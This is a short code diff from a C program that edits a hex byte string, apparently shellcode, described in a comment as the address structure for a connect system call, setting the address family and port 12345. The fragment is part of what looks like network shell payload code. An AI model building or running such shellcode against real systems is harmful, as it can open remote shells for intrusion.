@@ -64,7 +64,7 @@ int main(void)
                       ""
                       // "\xaa"
                       // "\x02"
-                      "\x30\x39\x02\xaa"
+                      "\xaa\x02\x30\x39"
                       "\x7f\xAA\xAA\x01"
                       "\x01\x01\x01\x01\x01\x01\x01\x01" // struct for connect syscall
                       ""
